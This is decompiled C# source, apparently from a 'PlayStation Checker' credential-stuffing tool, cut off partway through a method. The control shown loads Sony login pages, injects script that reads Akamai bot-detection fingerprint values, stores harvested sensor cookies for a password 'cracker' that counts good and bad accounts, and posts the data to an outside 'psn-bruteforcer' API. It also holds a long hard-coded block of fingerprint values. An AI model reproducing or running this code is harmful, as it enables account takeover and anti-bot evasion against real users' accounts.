using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Data.SQLite;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text.RegularExpressions;
using System.Threading;
using System.Transactions;
using System.Windows.Forms;
using Bunifu.Json.Linq;
using Leaf.xNet;
using Properties;

namespace PlayStation_Checker_by_Halo
{
	// Token: 0x02000029 RID: 41
	public class UCSensorLeecher : UserControl
	{
		// Token: 0x1700004F RID: 79
		// (get) Token: 0x06000194 RID: 404 RVA: 0x000123F4 File Offset: 0x000105F4
		// (set) Token: 0x06000195 RID: 405 RVA: 0x00002AE0 File Offset: 0x00000CE0
		public int AllTries
		{
			get
			{
				return this.allTries;
			}
			set
			{
				this.allTries = value;
				this.tries_lbl.Text = value.ToString();
			}
		}

		// Token: 0x17000050 RID: 80
		// (set) Token: 0x06000196 RID: 406 RVA: 0x00002AFB File Offset: 0x00000CFB
		public int LoadedProxy
		{
			set
			{
				this.LoadedPx_lbl.Text = value.ToString();
			}
		}

		// Token: 0x17000051 RID: 81
		// (get) Token: 0x06000197 RID: 407 RVA: 0x0001240C File Offset: 0x0001060C
		// (set) Token: 0x06000198 RID: 408 RVA: 0x00002B0F File Offset: 0x00000D0F
		public int Errors
		{
			get
			{
				return this.errors;
			}
			set
			{
				this.errors = value;
				this.errors_lbl.Text = value.ToString();
			}
		}

		// Token: 0x17000052 RID: 82
		// (get) Token: 0x06000199 RID: 409 RVA: 0x00012424 File Offset: 0x00010624
		// (set) Token: 0x0600019A RID: 410 RVA: 0x00002B2A File Offset: 0x00000D2A
		public int Goods
		{
			get
			{
				return this.goods;
			}
			set
			{
				this.goods = value;
				this.good_lbl.Text = value.ToString();
			}
		}

		// Token: 0x17000053 RID: 83
		// (get) Token: 0x0600019B RID: 411 RVA: 0x0001243C File Offset: 0x0001063C
		// (set) Token: 0x0600019C RID: 412 RVA: 0x00002B45 File Offset: 0x00000D45
		public int Bads
		{
			get
			{
				return this.bads;
			}
			set
			{
				this.bads = value;
				this.bad_lbl.Text = value.ToString();
			}
		}

		// Token: 0x17000054 RID: 84
		// (get) Token: 0x0600019D RID: 413 RVA: 0x00002B60 File Offset: 0x00000D60
		// (set) Token: 0x0600019E RID: 414 RVA: 0x00002B68 File Offset: 0x00000D68
		public HtmlDocument HtmlDocument { get; set; }

		// Token: 0x17000055 RID: 85
		// (get) Token: 0x0600019F RID: 415 RVA: 0x00002B71 File Offset: 0x00000D71
		// (set) Token: 0x060001A0 RID: 416 RVA: 0x00002B79 File Offset: 0x00000D79
		public HtmlElement MailInput { get; set; }

		// Token: 0x17000056 RID: 86
		// (get) Token: 0x060001A1 RID: 417 RVA: 0x00002B82 File Offset: 0x00000D82
		// (set) Token: 0x060001A2 RID: 418 RVA: 0x00002B8A File Offset: 0x00000D8A
		public HtmlElement PasswordInput { get; set; }

		// Token: 0x17000057 RID: 87
		// (get) Token: 0x060001A3 RID: 419 RVA: 0x00002B93 File Offset: 0x00000D93
		// (set) Token: 0x060001A4 RID: 420 RVA: 0x00002B9B File Offset: 0x00000D9B
		public HtmlElement SubmitButton { get; set; }

		// Token: 0x060001A5 RID: 421 RVA: 0x00012454 File Offset: 0x00010654
		public UCSensorLeecher()
		{
			this.InitializeComponent();
			this.tabControl1.TabPages.Remove(this.tabControl1.TabPages[1]);
			ControlsLink.GetLink().Leecher = this;
			this.uri_cb.SelectedIndex = 1;
			this.LeechMode_cb.SelectedIndex = 1;
			this.CreateDataFile();
			try
			{
				GeneratorStaticDependencies.Connection.Open();
			}
			catch
			{
			}
			this.Refresh_btn_Click(this, new EventArgs());
			Control.CheckForIllegalCrossThreadCalls = false;
		}

		// Token: 0x060001A6 RID: 422 RVA: 0x000124F8 File Offset: 0x000106F8
		private void CreateDataFile()
		{
			if (!Directory.Exists(Directory.GetCurrentDirectory() + "/Data"))
			{
				Directory.CreateDirectory(Directory.GetCurrentDirectory() + "/Data");
			}
			if (!File.Exists(Directory.GetCurrentDirectory() + "/Data/CookiesDB.db"))
			{
				SQLiteConnection.CreateFile(Directory.GetCurrentDirectory() + "/Data/CookiesDB.db");
				GeneratorStaticDependencies.Connection.Open();
				this.CreateTabel(GeneratorStaticDependencies.Connection);
			}
		}

		// Token: 0x060001A7 RID: 423 RVA: 0x00012578 File Offset: 0x00010778
		private void CreateTabel(SQLiteConnection connection)
		{
			string commandText = "CREATE TABLE IF NOT EXISTS Sensors (ID INTEGER PRIMARY KEY,Cookie TEXT(500) NOT NULL,Host varchar(255));";
			using (SQLiteCommand sqliteCommand = new SQLiteCommand(commandText, connection))
			{
				sqliteCommand.ExecuteNonQuery();
			}
		}

		// Token: 0x060001A8 RID: 424 RVA: 0x000125B8 File Offset: 0x000107B8
		private DataTable FetchAll(SQLiteConnection connection)
		{
			DataTable result;
			try
			{
				string commandText = "SELECT * FROM Sensors";
				DataTable dataTable = new DataTable();
				using (SQLiteDataAdapter sqliteDataAdapter = new SQLiteDataAdapter(commandText, connection))
				{
					sqliteDataAdapter.Fill(dataTable);
				}
				result = dataTable;
			}
			catch
			{
				result = null;
			}
			return result;
		}

		// Token: 0x060001A9 RID: 425 RVA: 0x00012614 File Offset: 0x00010814
		private DataTable FetchAll(string cmd, SQLiteConnection connection)
		{
			DataTable result;
			try
			{
				DataTable dataTable = new DataTable();
				using (SQLiteDataAdapter sqliteDataAdapter = new SQLiteDataAdapter(cmd, connection))
				{
					sqliteDataAdapter.Fill(dataTable);
				}
				result = dataTable;
			}
			catch
			{
				result = null;
			}
			return result;
		}

		// Token: 0x060001AA RID: 426 RVA: 0x0001266C File Offset: 0x0001086C
		public bool ExecCMD(SQLiteConnection connection, string command)
		{
			bool result;
			try
			{
				if (command.ToLower().Contains("select"))
				{
					this.SensorsGrid.DataSource = this.FetchAll(command, connection);
					UCSettings._cracker.Sensors.Clear();
					foreach (object obj in ((IEnumerable)this.SensorsGrid.Rows))
					{
						DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
						try
						{
							string sensor = Uri.UnescapeDataString(dataGridViewRow.Cells["Cookie"].Value.ToString());
							UCSettings._cracker.Sensors.Add(new Sensor(sensor));
							UCSettings._cracker.SensorsTemp.Add(new Sensor(sensor));
						}
						catch
						{
						}
					}
					Sensor.refreshed = 0;
					this.All_lbl.Text = this.SensorsGrid.Rows.Count.ToString();
				}
				else
				{
					using (SQLiteCommand sqliteCommand = connection.CreateCommand())
					{
						sqliteCommand.CommandText = command;
						sqliteCommand.ExecuteNonQuery();
					}
				}
				result = true;
			}
			catch (Exception)
			{
				result = false;
			}
			return result;
		}

		// Token: 0x060001AB RID: 427 RVA: 0x00002050 File Offset: 0x00000250
		private void Uri_cb_SelectedIndexChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x060001AC RID: 428 RVA: 0x00012804 File Offset: 0x00010A04
		private void Browser_bw_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
		{
			this.HtmlDocument = this.browser_bw.Document;
			if (this.uri_cb.SelectedIndex == 0)
			{
				new Thread(delegate()
				{
					Thread.Sleep(5000);
					base.Invoke(new ThreadStart(delegate()
					{
						try
						{
							this.InjectScript();
							this.MailInput = this.browser_bw.Document.GetElementById("ember17");
							this.PasswordInput = this.browser_bw.Document.GetElementById("ember19");
							this.SubmitButton = this.browser_bw.Document.GetElementById("ember21").FirstChild;
							this.Mail_ID_tb.Text = ElementCollection.CreateCommonElementFromFullElement(this.MailInput).ToString();
							this.Pass_ID_tb.Text = ElementCollection.CreateCommonElementFromFullElement(this.PasswordInput).ToString();
							this.Submit_tb.Text = ElementCollection.CreateCommonElementFromFullElement(this.SubmitButton).ToString();
							this.ID_tb.Text = this.SubmitButton.Id;
							this.calculateFpcf();
						}
						catch
						{
						}
					}));
				}).Start();
			}
			else if (this.uri_cb.SelectedIndex == 1)
			{
				try
				{
					this.InjectScript();
					this.MailInput = this.browser_bw.Document.GetElementById("j_username");
					this.PasswordInput = this.browser_bw.Document.GetElementById("j_password");
					this.SubmitButton = this.browser_bw.Document.GetElementById("signInButton");
					this.Mail_ID_tb.Text = ElementCollection.CreateCommonElementFromFullElement(this.MailInput).ToString();
					this.Pass_ID_tb.Text = ElementCollection.CreateCommonElementFromFullElement(this.PasswordInput).ToString();
					this.Submit_tb.Text = ElementCollection.CreateCommonElementFromFullElement(this.SubmitButton).ToString();
					this.ID_tb.Text = this.SubmitButton.Id;
					this.calculateFpcf();
				}
				catch
				{
				}
			}
			string text = Regex.Match(this.browser_bw.DocumentText, "resources/(.*?)'").Groups[1].Value;
			text = (string.IsNullOrEmpty(text) ? ("public/" + Regex.Match(this.browser_bw.DocumentText, "public/(.*?)'").Groups[1].Value) : ("resources/" + text));
			GeneratorStaticDependencies.SensorUri = text.Insert(0, this.browser_bw.Url.Scheme + "://" + this.browser_bw.Url.Host + "/");
		}

		// Token: 0x060001AD RID: 429 RVA: 0x000129E4 File Offset: 0x00010BE4
		public void InjectScript()
		{
			string innerHtml = "function getPoint(a,b){var e = b == 0 ? document.getElementsByName(a) : document.getElementById(a);rect = (e.length) ? e[0].getBoundingClientRect() : e.getBoundingClientRect();return Math.floor(rect.left) + '|' + Math.floor(rect.right) + '|' + Math.floor(rect.top) + '|' + Math.floor(rect.bottom);}function al(){alert('injected');}function getCanvas(){return bmak.fpcf.canvas();}function getRVS(){var str = \"\";for(i=0;i<500;i++){bmak.fpcf.fpVal();str += bmak.fpcf.rVal + \"|\" + bmak.fpcf.rCFP + \"@\";}return str;}";
			HtmlElement htmlElement = this.browser_bw.Document.CreateElement("script");
			htmlElement.InnerHtml = innerHtml;
			this.browser_bw.Document.GetElementsByTagName("head")[0].AppendChild(htmlElement);
		}

		// Token: 0x060001AE RID: 430 RVA: 0x00012A38 File Offset: 0x00010C38
		private void calculateFpcf()
		{
			string rval = this.browser_bw.Document.InvokeScript("getCanvas").ToString();
			string rvs = string.Empty;
			if (ControlsLink.GetLink().About.txtLicenseKey.Text == "txtLicenseKey")
			{
				new Thread(delegate()
				{
					Application.Run(new frmLoading());
				}).Start();
				rvs = this.browser_bw.Document.InvokeScript("getRVS").ToString();
			}
			try
			{
				fpcf.canv = new List<string>();
				string vls = "216|-1602688414@458|379492109@90|510370851@895|96854085@784|-1191139268@234|-1502545694@31|1971038085@625|-1354930724@293|425304259@642|-443555430@650|-1899390382@459|15793310@89|-1326682710@940|1416475212@519|1865500571@153|-164573219@944|-2093028635@646|430117963@270|-413467513@521|-122091292@32|-927499538@730|1354871170@607|-35804262@905|-895059037@213|-778605702@171|-141787724@159|-598416143@636|1451591032@158|1046495847@189|130513369@357|391445190@716|-1508066288@920|-935049370@771|-704320230@60|2036955194@567|-936377600@108|-926600379@377|-1730315281@16|1827159075@312|1513814338@809|-1636799511@2|-984401575@181|251655609@828|2121827284@142|1653379017@371|-595728248@943|800439959@674|969394590@855|-1771444938@62|-162775122@772|1352455686@946|1979877480@939|-2574423@685|-1561797585@610|-1312178040@186|2125803845@565|637441287@821|-1769512416@834|-228726727@953|1301785473@702|1692038695@454|1896613521@170|-1229160596@965|-507801518@698|744025839@873|2131836937@900|342561186@297|-162265101@366|-1059613812@480|222307827@988|1506339757@703|-1436498638@272|757983861@444|1148512218@136|-1519779148@221|211011575@637|856324041@274|527142636@211|-459206100@172|-101349770@808|1650747484@985|-367378233@738|-1833957778@755|294414637@553|-1508784215@541|-1453719624@844|1000699390@648|1548229657@109|1958174888@797|-1069264498@851|1596321561@992|-858377096@40|1953984268@881|46870926@562|-1808329924@864|-707855444@806|551292841@709|-651240503@681|-2121558128@393|559484055@176|-1814362432@930|956975145@352|1469303014@817|-1331976939@7|1708790942@983|962546342@846|-534409462@872|-1220902064@927|-1333308618@341|86604890@915|1269468413@852|-55353947@86|-1406371208@204|1077836026@966|-309184751@922|1348942368@710|1850688672@453|-509318565@411|1725276121@991|1155102031@635|-2054810541@484|-1080175161@184|703288525@668|-1609503915@36|715154467@464|1579664023@131|-772683338@133|-1680099504@298|-1038709899@224|-2013787365@194|1386882429@465|-489106489@937|407309703@660|1581197218@531|1284486727@903|199347431@861|552360890@477|-1160114410@387|-351464550@276|-791745953@795|800476576@409|-508873853@358|1401944975@13|-1407046884@622|-108580994@75|-501434747@126|16185253@407|-1365999157@466|1069494277@382|2063892148@679|188440143@301|-343556508@693|1049657435@707|521516591@588|1422789621@120|1364985649@461|-1304956927@368|-1267342888@427|422525871@747|1260399242@256|904195968@520|1316411405@179|1899898176@437|-1036599886@100|-2113522963@250|645635196@101|1543943351@495|-277469012@841|-196475590@242|753692254@450|2090046699@605|-48296849@911|912865698@866|-1858187195@282|81168367@672|1655516940@913|-566008242@959|1654019991@277|1280693056@255|-1100004049@68|1497180053@684|421454815@885|-1995841708@802|1723591762@875|81683710@157|1362799197@262|16866617@502|388174783@493|-1762248839@391|300835973@430|147329306@338|1490233625@275|-278844589@613|-1781287246@206|-1397604948@326|532283459@431|252184148@163|1797835040@457|-1185592380@152|837041817@578|-636954871@811|-1133876235@15|-1674536379@603|1525615840@93|50668528@768|366312954@906|382088834@419|-1341458481@954|-212505950@951|-701736591@558|1412596757@304|-611966994@692|-921254926@798|-1150625159@425|-1173399181@741|334677138@671|929130652@420|-342344807@938|1466247167@626|355915219@330|-1388554867@473|648462833@362|1902775143@512|370363301@592|-318335211@721|141187868@874|-1650584978@628|-796367320@548|662625637@485|1027250631@867|-1078194557@961|-394797377@53|1211369183@8|-746824492@33|-1897789822@952|1421806652@321|-1267931992@833|1528186312@169|1157433388@617|1658392288@862|-1484922711@46|-934257480@837|-362356959@34|-1308195147@478|1475654750@547|2000434121@238|797931723@993|-1394582011@616|869289552@143|1709304205@794|447139561@743|15019450@530|-786573684@82|2021631966@803|1852923525@758|-398090176@423|-1662035305@865|1876782441@447|1034885445@726|1781914617@114|717533158@560|-1308420981@786|-850302458@945|-1452969870@729|1520918565@527|4271872@627|1015524179@580|982166581@897|112363176@830|-851045273@322|-1415850791@422|-154508713@449|-173014960@695|224430070@103|1185997128@518|889684719@208|1712143131@435|-1718362111@746|-598935434@324|-513695861@116|-155508908@41|-770998653@967|-847069880@365|892466926@842|-2134632899@197|113957338@350|696345708@281|-1329745616@683|1758417792@91|1148469346@401|438332399@124|1937462862@571|1580089566@122|2111573044@606|-572933696@343|-2125690659@857|1428327487@85|306772574@207|-1512872065@415|-1088728169@618|1986403420@4|-577567787@323|453303536@982|-305159109@499|-1553282929@346|251961717@549|437875317@995|-356275386@251|-545485206@686|-2113546859@651|1601423273@630|-1840147066@167|640441488@535|-1281755382@442|-1741296079@775|379417367@691|1350062601@481|976661257@150|2028383248@492|295422818@556|472914386@587|1619095017@497|-171326650@704|1440844656@198|-1307248612@316|1378841148@38|-10808386@925|-1753148522@248|2016686144@413|-1607478203@397|1932684927@532|447168288@978|806929369@102|1999618561@989|-1001285763@542|1778865970@132|-1736900366@378|1466797110@30|-1311883048@949|-975249193@742|-105824327@969|2101242593@880|1386835293@722|-1766071162@598|102740166@788|-1538400458@399|297811341@417|-435202601@924|-1080872428@74|-205628335@95|-780521173@115|-1787358443@663|-1279467123@363|1032621113@253|1143295491@66|1122111655@620|-1455349017@728|-812031564@188|2136405361@232|-1185362412@487|194368432@974|-1287519901@376|-846081076@664|-1805602864@919|-828885031@475|534684866@665|-389075764@364|-1316574208@804|-1802411456@412|-1598404512@700|467000963@735|1212813405@119|427536002@667|-792600238@822|-74155691@353|956903820@810|794668346@544|-1885351705@957|820804529@314|-860487599@49|1551024823@529|-866694422@586|-1523337897@591|-1829704018@639|699942121@440|-1449853925@209|483910621@621|1246893780@244|-1312397688@57|1801027206@113|-1672159095@175|-1004551199@217|176045444@327|1143273791@675|-593020228@731|-1717982078@39|103490312@523|-388625047@360|-773794974@96|-381960519@847|-871657634@5|-1637230120@624|-1157678394@673|-236701425@337|1224456554@418|929270720@773|846544800@37|-2091493463@956|-167061480@200|-1490853138@536|-1170104378@928|-1406773351@141|429521858@284|1163595891@25|297531953@559|678613335@645|404179344@396|-1832972009@608|-1575423943@1|183761325@483|1541460978@329|-770418270@118|-1159259994@388|349810509@508|-1819928585@428|-419230868@896|-1634649848@292|1439537509@386|1299897419@443|2003351017@400|-1424024401@912|-633323594@737|199399456@79|-2052846006@824|401111428@941|-1688102337@871|195185541@349|1389170836@818|-656715652@300|-93794362@581|-2049809998@35|172375973@714|905365241@551|-157723928@888|-2060297507@762|-1826958792@125|986255629@717|183922524@359|-983074571@914|-775768847@254|-1365883687@355|-708068447@769|584661992@64|1396305576@482|-1535050949@590|-1113128868@334|-1494608866@174|-539099419@205|-681893369@764|-865639610@441|-968133528@178|-1253105400@373|-1685066885@340|1263213168@269|118277980@259|-1797520265@644|425030782@345|-106274084@410|-1272044612@195|-2020904984@379|-81724452@819|-1865146206@612|-1457973067@661|1978468043@572|-1955569376@344|-460180943@199|-1522651248@436|-1827716208@162|-322124115@146|2038737095@849|-1366683453@145|-1171952376@669|1971145436@65|1211535753@540|-45484449@890|24695466@801|-461999574@19|-397778871@898|504185998@793|622219275@319|999778547@594|-1800276221@539|1021142791@677|-1768191646@600|-256159659@503|-620791548@462|-1608157371@601|351950027@816|-942064511@678|-1125772059@510|-1492773001@182|-1370024808@92|-1745075881@384|1198198730@596|542648252@555|2087276718@177|-338434058@894|-1375808516@932|877921116@619|-720520368@367|-1611797512@226|361557142@826|-859813331@183|390106693@107|1357855972@658|-249877816@987|-1420114242@76|1295978915@676|1504978131@225|-442968041@537|1280931936@235|-194160815@641|-1582985926@67|-1759659006@543|1961170375@910|-2059269813@395|149594695@438|832359290@22|-1272208138@97|199103260@328|-731714697@870|-1677626132@947|-1445052073@759|-1544571420@697|-201631745@948|513495214@634|-642094665@405|-795875096@385|542220194@931|1297479464@240|-968485131@73|-1283224845@615|-1094276052@445|251349352@701|-10800214@99|-584502047@711|-335888377@288|-1485099852@191|1222656232@229|-2095206454@907|-1518345681@595|1957451368@614|-394668500@602|399999931@892|-1927183220@863|132163400@805|2139307059@550|-1971008186@155|2010643452@525|-1365168461@652|82908197@825|-1076869783@770|1894078182@305|-240491985@936|1009272907@886|2088929216@694|1495741720@404|130405755@383|-1782198518@486|487411603@315|-2132359516@84|140642416@476|-1644175915@233|2121572555@160|1717707495@268|-1081505784@283|546500491@361|-2046243300@45|-1805648917@524|-800927038@23|-1842882279@112|364999987@574|1287361549@994|2004156627@883|415560335@853|177458872@725|-526394254@460|844156731@935|-824024895@149|1683331355@372|1885339109@390|9384862@496|-2130245289@964|-536235600@26|-2068640380@776|-1868426809@318|-806133736@380|1099819107@929|-516837480@643|-1977397457@557|-1339014913@706|-1632997390@858|400456561@662|618142516@429|1027850864@854|1901203870@589|-1758936736@860|462498675@130|-1760293387@744|-1057270205@202|1585803723@214|969365747@296|1982603220@782|-1718033820@748|992798706@514|-414780716@763|-172343976@751|905132871@986|1663279555@554|1804752440@134|-612576184@424|1340722394@882|-1165806290@151|228362967@185|975738285@381|-891020356@839|591214544@320|1628915403@604|-1986326379@734|1583681166@287|-534378317@765|-2089017784@796|153620873@494|1163440984@715|-1106667993@968|-1850495278@302|938089425@471|-404950180@129|1353094998@369|1058934489@980|1864355763@308|1358623575@933|-618036692@623|420420174@647|-499951577@117|-566096275@212|531084809@568|1341291607@975|-257883059@840|-1097734475@21|1547170650@98|283098078@317|1971038171@916|-1307003340@24|1762516086@313|-101101813@739|-623832863@876|-1075017216@6|1149100926@780|-200103577@105|-1351981641@215|1242210162@909|-722010866@997|756781570@456|922341497@719|857703571@61|-1119518132@787|2042898322@249|-1807869781@491|68691901@18|-1445892045@201|-1353878157@564|842725734@813|-1853606332@241|2027764988@154|231850435@3|1911760842@908|-552002635@392|-688930341@452|100864696@42|475661290@463|1235664054@877|-320160371@534|-986208391@500|-298232293@653|-1750873810@285|-147058219@996|-2023933654@55|1036382353@511|-1847955961@656|-480554829@515|1239056282@507|134677892@917|-1939658768@347|2067475239@899|-972844560@753|-247993853@291|1467019668@631|41957587@832|1508418466@501|-520768870@403|181059778@745|-2089915820@12|-1484363298@128|-64069868@921|-202047353@88|1020131427@335|-305651621@237|-1909274681@960|1889232982@81|2144501484@812|-241222519@984|-1109829167@814|1805525027@713|456630982@766|1242643679@138|2083846460@727|-2064218179@77|609047803@63|1366935842@110|726493595@792|1769319843@14|-2114714620@470|1742959908@732|-900741734@533|1211759175@70|841710311@850|1774277358@468|-1499708261@137|-492816715@58|1061635568@80|-1122330869@218|-1617997169@893|-1209910940@261|147895220@970|1228186135@325|1629852809@807|531390468@561|-1470394554@402|328435536@958|-1490912385@490|-1400768696@339|-1039825913@342|-1813988866@504|1550640657@569|449297034@926|2087150058@140|1970301984@760|470695734@426|1258825517@307|-1301696163@712|1194762932@173|1716333293@756|-58676633@467|367857989@311|-328204394@638|-1897971854@222|-1617528338@687|-1904411836@522|-1994427291@416|1299265502@394|1941108@408|-1038751701@236|1553920517@144|465885463@973|161831588@123|1208118548@472|-929248723@421|-1812334986@243|1535780567@246|-559613639@999|-1687206350@83|-1004047284@111|730112044@657|1243515276@724|1393292985@20|1603266485@582|290435553@271|-1250970060@689|-2040335648@104|1814279197@723|-1388682222@752|1857075546@273|573276125@998|1558262293@972|853863046@210|-118839812@688|1408619668@247|724274872@489|-940603909@705|1787089890@193|1085126320@799|1843065002@223|1114519373@306|-2082685430@203|-563845935@761|-1937335668@566|-513133224@94|-143191135@831|-1706828126@78|-1164496240@579|1833234726@406|562098723@868|1357394841@332|461744831@754|-1611448466@971|-828340316@820|2146531385@838|2025330130@295|1640067242@147|725504970@632|-1623772209@260|1576716273@923|-445838602@164|1692121434@54|-588082829@354|144838397@789|-1152724393@609|877952816@72|-1043728961@649|-596532767@774|-203741826@690|199172996@17|-1061411845@451|1444982246@889|-399550468@509|1767564339@266|741578983@0|506789438@220|1910440356@231|924185974@545|349139513@629|96081415@835|-1545640531@166|-1346606576@148|1096728124@29|908146159@356|315807795@682|2142808586@962|1600228667@829|-1846659916@375|-774989143@655|1171811140@455|-1425012806@859|1585413593@785|1334562036@902|1557409632@374|-652689042@28|1189244125@87|-826177235@433|1319908665@736|-605393044@640|-997188174@446|325622495@333|-1624389248@47|-1351973247@599|1446482983@310|1424674029@750|866757808@597|720116235@708|-621171208@265|1671356426@50|1413254839@192|1389137383@526|-1534335099@309|881870@448|210482056@680|-538614359@868|1424311133@250|-124232364@12|-509737185@436|-577129543@882|1947120611@678|2017868700@517|-2070162686@408|1560771509@115|1351290510@43|1735200100@92|194791201@695|-1214091644@289|603854457@36|1052181779@609|-543727606@738|807556942@391|-1850922547@914|-2024199482@85|436170386@457|1448502136@228|192304081@276|596684502@814|-697826637@246|1732668558@691|131685704@654|1139701156@204|-808089773@329|-1192298296@779|1565197280@760|1717793716@308|-1227315319@5|-1369843420@793|-1379621167@657|1224614318@826|-142952154@503|348747100@375|-902432146@266|2118302124@331|485487180@123|-981682515@9|1488324319@176|-2117228020@307|1043739501@146|-1674568115@15|1387029957@887|384075670@830|2039657014@845|-1118632887@883|1796313270@547|-570438395@940|-658836298@361|907003606@392|-1299998744@480|2063135385@498|2090187587@604|217593178@998|1624761112@893|-1314218612@409|502018299@356|-2127728841@4|1439689418@419|-1780142305@298|-1042601097@683|370945187@357|-1053410796@916|1742209819@251|-1517727884@175|741780410@841|1640554470@931|-1107742927@193|337005048@504|672554111@411|-773250751@740|819262051@988|129981051@295|1184778547@121|1480429421@926|58682257@257|-1787798885@384|-1655269974@736|882636569@562|-1915222178@807|-992849415@471|212103476@211|-1070347220@699|1892783584@400|-826216993@818|876987680@515|-1975344024@166|2114540533@143|-690398986@47|-1486923586@872|441627558@493|-1457032902@324|-1236393154@847|251438217@338|1221135907@476|742019314@629|195335439@136|1914154387@274|776852518@56|-240229615@537|280180143@941|-515460669@929|1402665664@465|1371039139@491|-2098851074@148|-1726112645@680|1605294724@293|1616418638@74|1220984909@987|-746772471@880|-470065309@371|-609444718@823|-1758662109@660|-1100345727@208|1743631564@970|-1704835314@468|1642782095@501|-1888416468@100|-2134785431@304|1241056552@541|-1362349821@138|-288547301@192|1186406497@518|2008722867@832|-172717878@652|-1315022592@31|2028861363@38|-1079166467@245|-1216103783@939|-1323369069@297|1179887984@972|-858236519@0|-461197618@323|-291449090@454|-222418841@244|-1170507732@544|-595663120@489|1838409915@502|931094317@983|-202849024@415|-889130735@70|1496980826@310|1055429236@255|-1828052015@217|1092907786@83|287551928@723|1940173553@49|-1566643905@37|437384679@367|229367165@94|993118891@593|-384662780@720|280392715@151|-2122789778@516|-180045389@118|-660981369@265|1975858607@351|1269487767@684|942968090@279|893543252@163|1719222178@791|-1040570066@430|1964425905@479|-1456944736@144|-259359943@157|218835665@29|2088207643@977|-194130750@14|-2145382993@955|1554578958@111|-861709289@174|1607205020@570|-1454024004@557|-421315880@817|-582664562@194|-1042933087@52|-1954284556@288|2139353328@249|-243763189@535|-1405748229@365|51770539@911|-1920338989@954|-368782737@303|-944146742@441|1758522590@963|1852408678@918|-75362983@774|1592998517@22|610281275@741|234497159@494|1418699638@156|-2020224518@590|-2017461121@165|1527237618@966|1760826319@164|-1113976194@216|-1842144922@906|-852318328@62|-1618074604@605|1666879313@379|668326269@355|485781442@669|-909429169@643|298162961@885|1709480239@191|-337628458@735|1063708904@846|-128675678@628|-337337480@731|-1783572910@320|-1018116966@836|972674586@838|-981242590@169|754190115@24|-1618924751@748|-1883366050@372|2116546253@932|1846582023@521|-1790514926@269|553213686@614|-432637579@96|72669362@952|1638170904@102|-1460283493@508|846738271@270|-1840199611@247|35494082@10|-1777266407@354|1415410121@640|-604429535@639|-1889942613@922|-1827170639@656|161984608@661|-701703722@124|1542692650@172|712867735@437|-2010347297@473|-1747208592@919|1118311110@389|-1497507608@68|1334340546@259|-204052060@709|1682232187@467|-746910980@986|-919395539@195|1960501260@370|1349940304@39|-854162613@243|1592095381@1|-336901035@349|1652236051@57|77380975@806|-2019798936@670|-1556867914@960|552246273@318|-1852354266@253|-910658492@273|1592614283@69|1191505854@572|-87322837@705|-2041368953@319|-804933815@21|-1287288279@801|1186230980@792|198725991@373|388010861@64|341908836@199|806916877@283|-1465876557@177|-1074824623@472|-236312146@533|-1604902614@108|-1371670114@184|-900920951@152|343759178@214|-1646433645@113|1604909736@615|-164555574@125|-957956870@884|1081016033@536|-748422320@460|-1884286677@646|863601791@681|422777023@58|-580913921@264|-1482234464@637|1863797547@956|-279113430@405|-1747617531@513|-1858289095@737|-1857633373@808|2031696776@552|2101727687@526|498106178@461|1389712429@312|247513863@80|-2031349170@292|-468250001@386|-860794221@567|-1641783966@757|-157069029@230|734792807@388|-1462166279@109|-1661169632@608|830662121@899|276444576@689|1834290574@198|703287502@800|236184847@225|-1000864353@561|949170467@805|1975813172@424|-1689452045@622|-2011496317@210|-212357399@11|-406698331@905|1362318985@750|1125250102@302|-214749682@522|627738176@655|1314373045@949|-528863349@961|-235712453@55|911874664@179|1070004502@510|-1356098653@672|1910313775@575|1052480424@968|-1021407380@574|562969914@6|-1861599279@586|174106998@530|-1572620682@978|-1958342392@854|-162443118@974|884938122@603|319956366@161|238212993@34|-1220833012@380|-1696311090@797|241126448@601|-260219428@505|-1895049578@852|-154476301@235|-1024854873@452|1155460958@595|-1705639607@985|100434304@23|-347974916@420|-1729530520@459|-2002374109@824|-1671157245@132|801055165@158|-1769831728@486|1272520718@396|-352077427@967|1222634554@403|-1732429289@142|1235120855@327|-654011673@910|1778110131@671|1049432471@336|-902104771@641|-835499410@41|-1592477028@675|-867722072@340|945366566@155|-1756369798@596|-1251141348@719|-429456421@633|561504265@394|-468173482@168|396514575@944|-684726684@145|55053426@463|1233996142@565|-1644903687@921|926403157@617|883096557@294|1572819548@496|-1252138647@453|-571475884@326|299152372@860|31466646@849|1691842543@745|832094058@855|-44675795@485|-715433120@422|-76481894@783|1406416779@481|-2142526919@281|-773840133@272|1150441930@950|-1566406437@88|-1758438348@979|678990171@995|193307518@795|1226198049@867|553182398@546|1821313925@677|-1336065460@873|-868911201@844|-139998714@183|-1726061187@20|1187485759@553|-1131019770@500|-1981179006@746|-1968329893@712|16044771@26|-300908784@798|-362878540@886|835367176@763|-209618178@822|1354932353@87|1429059269@896|-138448726@876|179825963@865|-1351485806@744|569253172@560|-1332668248@378|1515814524@969|97509067@278|-170324352@871|1741584582@587|1477140137@767|1885937158@358|-1069965552@443|-1934480004@426|1587083086@879|-1583459693@618|-1054742641@407|100399456@439|-1826774217@789|-1404285292@584|-1512441088@785|724958595@679|965356101@531|1564811266@773|1783332868@851|-1387793125@891|271292002@519|1126853941@106|1095519598@708|1423060390@761|-1742357278@888|-870454508@907|-1363619351@583|1071531347@989|601296421@233|-2147446417@833|504597446@996|1056416615@777|742186498@938|-167505353@739|-624028041@72|1897028383@976|-285818459@752|178402007@734|-1331632322@648|805226100@421|2125905168@448|-681940542@569|-213741909@311|-1182316260@682|23463318@991|-229269724@482|-2009113608@690|-1050227273@770|-143832203@543|739716458@651|-41744680@902|80000036@850|-2072[...string is too long...]";
				new Thread(delegate()
				{
					using (HttpRequest httpRequest = new HttpRequest())
					{
						httpRequest.Post("https://api.halosoft.ir/psn-bruteforcer/canvas.php?query=write&path=cvs", string.Format("rval={0}&sval={1}", rval, Convert.ToInt32(rval) / 2 * 3), "application/x-www-form-urlencoded");
						if (ControlsLink.GetLink().About.txtLicenseKey.Text == "txtLicenseKey")
						{
							httpRequest.Post("https://api.halosoft.ir/psn-bruteforcer/canvas.php?query=write&path=rvs", "rval=" + rvs + "&sval=none", "application/x-www-form-urlencoded");
						}
						string json = httpRequest.Get("https://api.halosoft.ir/psn-bruteforcer/canvas.php?query=read&path=cvs", null).ToString();
						JObject jobject = JObject.Parse(json);
						foreach (JToken value in ((IEnumerable<JToken>)jobject["Content"]))
						{
